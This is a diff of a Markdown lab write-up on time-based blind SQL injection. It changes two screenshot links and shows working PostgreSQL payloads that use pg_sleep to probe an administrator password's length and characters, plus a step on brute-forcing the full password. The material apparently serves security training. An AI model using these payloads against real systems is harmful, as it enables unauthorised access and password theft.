@@ -26,7 +26,7 @@ Z'%3bSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep
 Z'%3bSELECT CASE WHEN (username='administrator' and length(password)>19) THEN pg_sleep(5) ELSE pg_sleep(0) END from users--
 ```
 
-![[attachments/sqli-lab-15/file-20260204140228775.png]]
+![[attachments/sqli-lab-15/file-20260206135416456.png]]
 
 4. Change the payload to find the first character of the admin password
 
@@ -34,7 +34,7 @@ Z'%3bSELECT CASE WHEN (username='administrator' and length(password)>19) THEN pg
 Z'%3bSELECT CASE WHEN (username='administrator' and substring(password,1,1)='k') THEN pg_sleep(5) ELSE pg_sleep(0) END from users--
 ```
 
-![[attachments/sqli-lab-15/file-20260204140441577.png]]
+![[attachments/sqli-lab-15/file-20260206135416459.png]]
 
 5. Now change the placeholders and change to cluster bomb mode to find the full admin password
 
